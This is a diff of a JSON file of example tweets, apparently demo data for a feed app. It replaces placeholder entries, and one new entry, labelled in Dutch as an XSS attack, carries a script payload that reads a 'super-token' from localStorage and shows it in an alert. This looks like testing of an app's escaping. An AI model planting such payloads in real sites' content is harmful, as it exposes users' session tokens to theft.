@@ -4,14 +4,10 @@
     "title": "Example tweet",
     "body": "This is the tweet body. Do you like this tweet? I don't. Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua."
   },
-  {
-    "id": 2,
-    "title": "Another example tweet",
-    "body": "Another example tweet for your tweet feed. Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua."
-  },
+  { "id": 2, "title": "test bericht ", "body": "hallo" },
   {
     "id": 3,
-    "title": "The tweets keep coming",
-    "body": "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua."
+    "title": "hack ",
+    "body": "dit is een XSS attack </p><script>$(document).ready(function(){ var token = localStorage.getItem(\"super-token\"); alert(token); });</script><p>"
   }
 ]
